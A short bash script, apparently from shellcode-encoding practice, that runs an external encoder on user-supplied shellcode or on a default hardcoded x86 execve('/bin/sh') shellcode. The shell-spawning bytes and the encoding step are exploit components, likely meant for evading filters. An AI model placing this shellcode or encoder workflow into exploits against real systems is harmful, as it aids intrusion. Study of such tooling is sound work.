#!/bin/bash

if [ "$#" -ne 1 ]; then
	echo "Usage: ./run <Your_shellcode_in_quote"
	sleep 1
	echo "Using execv(/bin/sh) shellcode"
	shellcode="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
	sleep 1
else
	shellcode=$1
fi
encoder=$(./encoder $shellcode)
echo "Encoded shellcode: $encoder"
